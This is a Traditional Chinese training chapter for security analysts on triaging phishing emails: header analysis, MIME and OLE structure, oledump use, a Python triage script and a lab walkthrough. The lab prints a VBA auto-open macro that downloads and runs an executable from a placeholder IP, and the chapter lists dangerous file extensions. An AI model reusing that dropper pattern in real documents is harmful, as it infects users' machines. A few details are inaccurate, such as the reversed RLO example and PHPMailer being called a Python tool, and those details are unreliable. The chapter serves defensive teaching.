# 10.2 釣魚郵件標頭與惡意附件初篩 (Phishing Header Analysis & Attachment Triage)

## 🚨 案發現場破題 (Incident Scenario & Mental Workflow)

週一上午 09:10，企業內部通報信箱收到一名人事部專員轉寄的可疑郵件：「`Re: 9月份勞保補充保費與退稅明細表.zip`」。專員表示：「信件寄件者寫著健保局官方信箱，且催促在今日午前完成身分核對，附件帶有一個壓縮檔，但點開後彈出錯誤視窗，電腦突然變得很卡。」

這是一起典型的**社交工程釣魚攻擊（Phishing with Weaponized Attachment）**！

初級分析師往往犯下致命錯誤：直接看郵件客戶端（如 Outlook）上顯示的 `From:` 地址，甚至直接在分析用的聯網主機上雙擊解壓縮附件，導致惡意木馬瞬間在內網擴散！

資深藍軍分析師的現場破案原則：**「純文字環境、由下而上、物理隔離初篩」**。
面對任何可疑郵件，第一動作永遠是提取原始的 `.eml` 或 `.msg` 純文字郵件檔案，使用文字編輯器剖析其底層標頭（Headers），依循**「由下而上（Bottom-Up）」的鐵律**逆推最初發信主機的真實 IP；對於惡意附件，則在隔離環境中使用 `file`, `oletools`, `strings`, `sha256sum` 進行非執行狀態下的靜態初篩。

郵件鑑識分析師破案思維流：
1. **EML 標頭底層逆推（The Bottom-Up Rule of Received Headers）**：跳過黑客可隨意偽造的 `From:`, `Reply-To:`, `Subject:`，直接鎖定郵件路由中繼記錄 `Received: from ... by ... with ...`。嚴格遵循「從最底下往上讀」，最底層的第一筆 `Received` 代表黑客客戶端或其操控的惡意發信第一跳（First Hop）！
2. **多重 MIME 邊界拆解（MIME Boundary Dissection）**：剖析多用途網際網路郵件擴展（MIME），定位 `multipart/mixed`, `multipart/related`, `multipart/alternative` 的分界線，手動提取 Base64 編碼的隱藏附件。
3. **高危雙副檔名與字元翻轉破解（Right-to-Left Override / Masquerading）**：識別黑客利用 Unicode 控制字元（如 `U+202E` RLO）將 `invoice_exe.pdf` 翻轉顯示為 `invoice_fdp.exe`，或使用空格隱藏 `.exe`, `.vbs`, `.iso` 真實副檔名。
4. **Office 巨量串流與 VBA 巨集萃取（OLE Structure & Macro Carving）**：針對 `.doc`, `.xls`, `.docm` 複合二進位文件，使用 `oledump.py` 分析 OLE Streams，秒級萃取 `AutoOpen`, `Document_Open` 自動執行函數與混淆 Shell 代碼。
5. **容器封裝規避檢測解構（Container Wrapping: ISO, LNK, OneNote）**：黑客為繞過微軟 Mark-of-the-Web (MOTW) 保護，將木馬打包在 `.iso`, `.vhd` 或 `.one` 檔案中；藍軍如何在無威脅環境下進行掛載與解構？

## 🧩 第一動：底層機制/協定解剖 (Mechanics & Physical Structs)

### 1. MIME (RFC 2045) 郵件複合結構物理層解剖

一封包含內文、HTML 與惡意附件的 `.eml` 檔案，本質上是一個以純 ASCII 字元組成的複合文檔。透過 `boundary` 字串將不同資料塊分離：

```http
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_Part_0123_456789.987654"

------=_Part_0123_456789.987654
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

敬啟者：請盡速查閱附件退稅明細，以免權益受損。

------=_Part_0123_456789.987654
Content-Type: application/x-zip-compressed; name="TaxRefund_2026.zip"
Content-Disposition: attachment; filename="TaxRefund_2026.zip"
Content-Transfer-Encoding: base64

UEsDBBQAAAAIAO5F...[Base64編碼的惡意ZIP二進位數據]...AAAA=
------=_Part_0123_456789.987654--
```

#### 關鍵標頭欄位鑑識意涵：
- **`Message-ID`**：發信伺服器指派的唯一編號。黑客自建腳本發信時，常出現語法錯誤、漏填或網域名稱與 `From:` 不符的特徵。
- **`Reply-To`**：指定受害者點擊「回覆」時的真實接收郵箱。在 BEC 詐騙中，黑客會在 `From:` 偽造老闆信箱，但在 `Reply-To` 填寫自己的外部免費信箱（如 `ceo-office@protonmail.com`）。
- **`X-Mailer` / `User-Agent`**：發信客戶端軟體特徵。黑客常用 Python 腳本（`Python-urllib`, `PHPMailer`, `swaks`）大量群發，該標頭會洩漏其自動化工具痕跡。

### 2. Office OLE 與 OpenXML 複合檔案底層結構

惡意 Office 文件分為兩大物理架構：
1. **舊版 OLE2 複合檔案二進位格式（`.doc`, `.xls`, `.ppt`）**：
   - 採用類似 FAT 檔案系統的複合二進位結構（Compound File Binary Format - CFBF）。
   - 檔案開頭 8 位元組為固定 Magic Number：`D0 CF 11 E0 A1 B1 1A E1`（記憶口訣：*Docfile*）。
   - 內部劃分為多個「流（Streams）」，巨集代碼存放於特定的 VBA Stream 中，常以特定編碼或壓縮形式存在。
2. **現代 OpenXML 壓縮包格式（`.docx`, `.xlsm`, `.docm`）**：
   - 本質是一個標準的 ZIP 壓縮包，Magic Number: `50 4B 03 04`（`PK..`）。
   - 若含有巨集，副檔名必須為 `m` 結尾（如 `.docm`），壓縮包根目錄下會包含 `word/vbaProject.bin` 二進位 OLE 檔案。

```text
【OLE2 二進位結構與 oledump 標記示意圖】
  Stream 1: \x05DocumentSummaryInformation
  Stream 2: \x05SummaryInformation
  Stream 3: WordDocument
  Stream 7: Macros/VBA/ThisDocument  [ M ] ──► (帶有 'M' 標記代表包含未編譯的可執行 VBA 原始碼!)
  Stream 8: Macros/VBA/NewMacros     [ m ] ──► (帶有 'm' 標記代表僅含巨集屬性或空殼)
```

## 💻 第三動：現場追兇——作戰指令與腳本庫

### 1. Linux / 鑑識終端郵件標頭深度鑑識命令庫

```bash
# 1. 快速提取 EML 中所有的 Received 路由跳數 (由上而下打印，最後一行即為第一跳源頭!)
grep -E -n -i "^Received: from" suspicious_email.eml

# 2. 萃取寄件人、回覆人與主旨
grep -E -i "^(From|Reply-To|Return-Path|Subject|Message-ID):" suspicious_email.eml

# 3. 檢查發信客戶端資訊 (X-Mailer)
grep -E -i "^(X-Mailer|User-Agent):" suspicious_email.eml

# 4. 使用 ripmime 工具一鍵從 EML 中剝離所有實體附件 (Attachment Carving)
ripmime -i suspicious_email.eml -d /tmp/carved_attachments/
ls -la /tmp/carved_attachments/
```

### 2. Office 誘餌文件 OLE 巨集靜態初篩實戰 (`oledump.py`)

```bash
# 1. 分析 Office 文件中的所有 Stream，尋找帶有 'M' (含有代碼) 的流
python3 oledump.py /tmp/carved_attachments/malicious_invoice.doc

```

### 3. 自動化郵件標頭溯源與附件鑑識初篩工具 (Python Phish Triage)

```python
#!/usr/bin/env python3
# 藍隊專用：自動化解析 EML 標頭路由，逆推第一跳發信 IP，並提取附件 SHA256 雜湊

import email
from email import policy
import sys
import re
import hashlib
import os

def triage_email(eml_path):
    print(f"[*] INITIATING PHISHING TRIAGE ON: {eml_path}")
    with open(eml_path, "rb") as f:
        msg = email.message_from_binary_file(f, policy=policy.default)

    print("\n=== Header Analysis ===")
    print(f"From       : {msg.get('From')}")
    print(f"Reply-To   : {msg.get('Reply-To')}")
    print(f"Subject    : {msg.get('Subject')}")
    print(f"Date       : {msg.get('Date')}")
    print(f"Message-ID : {msg.get('Message-ID')}")

    # 1. 逆推 Received 標頭路由 (由下而上)
    received_headers = msg.get_all("Received", [])
    print(f"\n[+] Total Hop Count : {len(received_headers)} hops.")
    
    if received_headers:
        # 最底層的第一跳 (The True Origin)
        first_hop = received_headers[-1]
        print(f"[*] FIRST HOP (True Sender Route - The Bottom-Up Origin):\n    {first_hop.strip()}")
        # 正則提取第一跳中的 IP
        ip_matches = re.findall(r'\[([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\]', first_hop)
        if ip_matches:
            print(f"[🚨 ROOT SENDER IP DETECTED] : {ip_matches[0]}")
        else:
            print("[-] No bracketed IPv4 found in first hop, inspect raw text above.")

    # 2. 遍歷並提取附件
    print("\n=== Attachment Triage ===")
    attachment_count = 0
    for part in msg.walk():
        content_disposition = part.get("Content-Disposition", "")
        if "attachment" in content_disposition.lower() or part.get_filename():
            attachment_count += 1
            filename = part.get_filename() or f"attachment_{attachment_count}.bin"
            payload = part.get_payload(decode=True)
            if payload:
                file_hash = hashlib.sha256(payload).hexdigest()
                file_size = len(payload)
                print(f" [📎 Attachment #{attachment_count}]")
                print(f"     Filename : {filename}")
                print(f"     Size     : {file_size} bytes")
                print(f"     SHA-256  : {file_hash}")
                
                # 檢驗高危副檔名特徵
                dangerous_exts = [".exe", ".vbs", ".js", ".hta", ".iso", ".scr", ".docm", ".xlsm"]
                if any(filename.lower().endswith(ext) for ext in dangerous_exts):
                    print(f"     🚨 HIGH-RISK EXTENSION DETECTED: {filename}")

    if attachment_count == 0:
        print("[-] No binary attachments detected in email body.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 phish_triage.py <target_email.eml>")
        sys.exit(1)
    triage_email(sys.argv[1])
```

## ⚖️ 第四動：研判分水嶺——真實威脅 vs 業務誤報

### SOC 研判核心問題表

| 核心提問（研判維度） | 本技術點實戰檢核標準 |
| :--- | :--- |
| **Q1：最底層第一跳 `Received` 記錄中的發信 IP，是否與寄件人組織的合法 ASN / IP 網段相符？** | 這是判定是否為「外部偽造發信」的物理鐵證！例如發信人聲稱是微軟官方，但第一跳 IP 隸屬於奈及利亞或某國私人主機，**必然是惡意偽冒**！ |
| **Q2：`From:` 欄位顯示名稱與角色的日常溝通模式是否吻合？** | 社交工程語意異常：日常稱呼「小李」的主管，突然在信中使用生硬的簡體中文或翻譯腔叫「李同志」，且信件帶有極度緊迫的時間威脅（如「限今日 12 點前處理」）？此為典型社交工程特徵。 |
| **Q3：附件解壓縮後的內部真實檔案類型（MIME Type / Magic Bytes）為何？** | 防範偽裝副檔名：檔案名看似 `invoice.pdf`，但用十六進位檢視開頭是否為 `MZ`（`4D 5A` 可執行檔）而非 `%PDF`（`25 50 44 46`）？若副檔名與 Magic Bytes 不符，100% 為惡意木馬偽裝。 |
| **Q4：Office 文件的 VBA 巨集中是否包含了自外部網路下載檔案的函數調用？** | 行為動機審查：合法財務報表巨集通常僅進行表格公式計算與列印排版；若巨集中出現 `URLDownloadToFile`, `WinHttp.WinHttpRequest`, `MSXML2.XMLHTTP` 或 `CreateObject("WScript.Shell")`，**必然為下載器惡意代碼（Dropper）**！ |
| **Q5：此郵件是否在同一時間段內發送給全網數十名甚至數百名跨部門同仁？** | 群發特徵比對：透過郵件伺服器日誌查詢同一個 `Message-ID` 或主旨。若是針對人事、財務、採購等多人無差別亂槍打鳥投放，屬於大規模釣魚攻擊（Spray Phishing）。 |
| **Q6：信件內文包含的超連結（Hyperlink），其實際跳轉 URL 與錨點文字是否一致？** | 檢驗連結真實性：使用者看到的文字是 `http://portal.company.com`，但實際滑鼠懸停後底層超連結指向 `http://198.51.100.23/login.php`？此為釣魚憑證竊取鏈。 |
| **Q7：附件中若包含加密壓縮檔（Password-Protected ZIP），密碼是否直接寫在信件內文中？** | 規避安全防毒分析：黑客常以「保護隱私」為由將壓縮檔加密並在內文提供密碼，真正目的是**防止郵件閘道器的防毒引擎與沙箱解開掃描**！此類信件需標記為最高疑點。 |
| **Q8：發起回信動作時，收件人是否會被強行引流至第三方的未註冊外部網域？** | 檢查 `Reply-To` 陷阱：若 `From:` 是正常的合作夥伴，但 `Reply-To` 被篡改為攻擊者控制的信箱，一旦同仁點擊回覆並寄出機密報價單，資料即刻失竊。 |

1. **禁用高危險性郵件附件格式（File Extension Blocking）**：
   - 郵件閘道器（SEG）預設阻斷以下副檔名：`.exe`, `.scr`, `.vbs`, `.js`, `.hta`, `.iso`, `.img`, `.vhd`, `.bat`, `.cmd`, `.pif`, `.cpl`。

## 🎯 靶場實戰檢驗 (Hands-on Lab Walkthrough)

### 靶場環境說明
- **鑑識樣本**：`suspicious_invoice.eml`（包含偽造的發信標頭與一個帶有巨集的 `.doc` 附件）
- **作戰任務**：利用命令列工具由下而上提取黑客的第一跳真實 IP，並使用 `oledump` 提取惡意 Word 檔案中的 VBA 代碼，還原黑客企圖從遠端下載木馬的真實 URL。

### 實戰驗證步驟

#### 步驟 1：使用終端逆推 EML 最底層真實發信第一跳
```bash
grep -E "^Received: from" suspicious_invoice.eml
```
- **終端輸出**：
  ```text
  Received: from mail.internal.corp by internal-smtp with ESMTP... (頂層第 3 跳)
  Received: from relay-node.clean-mx.com (203.0.113.10) by mail.internal.corp... (中間第 2 跳)
  Received: from mail.evil-c2.net ([198.51.100.99]) by relay-node.clean-mx.com with ESMTP... (最底層第 1 跳!)
  ```
  **鑑識研判**：最底層第一跳發信 IP 為 **`198.51.100.99`**！即便 `From:` 偽造為內部信箱，真實物理發起節點已被鐵證釘死！

#### 步驟 2：從 EML 剝離惡意 Office 附件
```bash
python3 -c '
import email, sys
with open("suspicious_invoice.eml", "rb") as f:
    msg = email.message_from_binary_file(f)
for part in msg.walk():
    if part.get_filename():
        with open(part.get_filename(), "wb") as out:
            out.write(part.get_payload(decode=True))
        print(f"Extracted: {part.get_filename()}")
'
```
- **輸出確認**：提取出附件 `Invoice_September.doc`。

#### 步驟 3：使用 oledump 分析 Word 檔案 Streams
```bash
python3 oledump.py Invoice_September.doc
```
- **分析輸出**：
  ```text
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  8: M    9240 'Macros/VBA/ThisDocument'
  ```
  第 8 號 Stream 標記為 **`M`**，證實含有巨集代碼！

#### 步驟 4：反編譯第 8 號 Stream 萃取惡意代碼
```bash
python3 oledump.py -s 8 -v Invoice_September.doc | grep -A 10 "Sub Document_Open"
```
- **代碼還原輸出**：
  ```vba
  Private Sub Document_Open()
      Dim evilUrl As String
      Dim dropPath As String
      evilUrl = "http://198.51.100.99:8080/payload.exe"
      dropPath = Environ("TEMP") & "\svchost_update.exe"
      Call DownloadAndRun(evilUrl, dropPath)
  End Sub
  ```

#### 步驟 5：實戰結論判定
- **研判結論**：**True Positive (武器化惡意郵件攻擊確鑿)**。
- **萃取出的威脅指標（IoC）**：
  - 第一跳真實發信 IP：`198.51.100.99`
  - 惡意 Payload 下載 URL：`http://198.51.100.99:8080/payload.exe`
  - 本地落腳點：`%TEMP%\svchost_update.exe`
- **處置行動**：全網防火牆立即封鎖 `198.51.100.99`，EDR 下發 `%TEMP%\svchost_update.exe` 查殺策略！

## 📋 過關驗收檢查點 (Mastery Checklist)

- [ ] **Q1：在分析 EML 郵件標頭時，為什麼必須嚴格遵守「由下而上（Bottom-Up）」的閱讀鐵律？最頂層的 `Received` 與最底層的 `Received` 分別代表什麼？**
  - *驗收標準*：答出因為郵件在網際網路傳輸時，每經過一個中繼郵件伺服器（MTA），該伺服器就會將自己的記錄「追加在最上方（Prepended）」。因此最頂層的 Received 是企業內部最後收到信件的本機伺服器，而最底層的 Received 代表信件最初發起時連接的第一跳 SMTP 伺服器與客戶端 IP，是最真實的來源證據。
- [ ] **Q2：什麼是 Unicode「RLO（Right-to-Left Override / U+202E）」欺騙手法？黑客如何利用它將可執行檔偽裝成 PDF？**
  - *驗收標準*：答出 RLO 是一個強制將後續文字從右向左顯示的 Unicode 控制字元（`\u202E`）。黑客將檔案命名為 `invoice\u202Efdp.exe`，作業系統渲染時會將 `fdp.exe` 翻轉為 `exe.pdf`，使終端使用者眼睛看到的是 `invoiceexe.pdf`（誤以為是安全文件），點擊後作業系統卻將其作為 `.exe` 可執行程式運行。
- [ ] **Q3：在使用 `oledump.py` 工具分析 Office 文件時，輸出結果中字母大寫 `M` 與小寫 `m` 分別代表什麼意義？分析師應優先鎖定哪一個？**
  - *驗收標準*：答出大寫 `M` 代表該 Stream 內部包含可提取、未編譯的有效 VBA 巨集程式碼；小寫 `m` 代表該 Stream 僅包含巨集相關的屬性定義或框架，不含可執行的代碼本體。分析師應優先使用 `-s <id> -v` 深入反編譯帶有大寫 `M` 的 Stream。
- [ ] **Q4：黑客為什麼近年來頻繁使用 `.iso` 或 `.vhd` 光碟映像檔打包木馬，而非直接寄送 `.exe` 或傳統 Word 巨集文件？**
  - *驗收標準*：答出因為微軟對從網路下載的文件會寫入 NTFS 交換資料流標記「Mark-of-the-Web (MOTW)」，會觸發保護模式並全面阻斷 Office 巨集運行。黑客將木馬打包在 `.iso` 虛擬磁碟中，使用者掛載虛擬磁碟後提取內部檔案時，MOTW 標籤不會繼承至內部檔案，從而完美繞過微軟的安全警告機制。
- [ ] **Q5：在分析惡意 VBA 巨集時，列舉出三個攻擊者最常用的「自啟動執行函數（Trigger）」名稱。**
  - *驗收標準*：答出：(1) `AutoOpen()` / `Auto_Open()`；(2) `Document_Open()`；(3) `Workbook_Open()`。
